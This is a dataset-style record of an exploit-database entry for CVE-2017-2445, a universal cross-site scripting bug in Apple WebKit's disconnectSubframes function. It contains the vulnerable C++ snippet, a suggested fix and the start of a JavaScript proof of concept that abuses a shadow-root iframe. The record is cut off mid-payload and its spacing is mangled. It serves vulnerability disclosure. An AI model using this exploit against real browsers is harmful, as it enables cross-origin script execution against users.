{
    "text": "ecve : CVE-2017-2445 ， title : Apple WebKit 10.0.2 ( 12602.3.12.0.1 ) - 'disconnectSubframes' Universal Cross-Site Scripting - Multiple webapps Exploit ， verified : Verified ， exploit_detail : < ! -- ， Source :  ， When an element is removed from a document , the function | disconnectSubframes | is called to detach its subframes ( iframe tag , object tag , etc. ) . ， Here is a snippet of | disconnectSubframes | . ， void disconnectSubframes ( ContainerNode& root , SubframeDisconnectPolicy policy )  ， Vector<Ref<HTMLFrameOwnerElement frameOwners ;  ， frameOwners.append ( downcast<HTMLFrameOwnerElement> ( root )  )  ;  ， collectFrameOwners ( frameOwners , root )  ;  ， // Must disable frame loading in the subtree so an unload handler cannot ， // insert more frames and create loaded frames in detached subtrees. ， SubframeLoadingDisabler disabler ( root )  ;  ， bool isFirst = true ;  ， // Don't need to traverse up the tree for the first owner since no ， // script could have moved it. ， owner.get (  ) .disconnectContentFrame (  )  ;  ， isFirst = false ;  ， The bug is that it doesn't consider | root | 's shadowroot. So any subframes in the shadowroot will be never detached. ， It should be like :  ， collectFrameOwners ( frameOwners , root )  ;  ， Element& element = downcast<Element> ( root )  ;  ， collectFrameOwners ( frameOwners ,  * shadowRoot )  ;  ， PoC :  ， --> ， var d = document.body.appendChild ( document.createElement ( \"div\" )  )  ;  ， var s = d.attachShadow ( {mode : \"open\"} )  ;  ， var f = s.appendChild ( document.createElement ( \"iframe\" )  )  ;  ， f.onload = (  ) => { ， f.onload = null ;  ， f.src = \"javascript : alert ( location ) \" ;  ， var xml = ` ， <svg xmlns=\"",
    "time": "2017-04-04"
}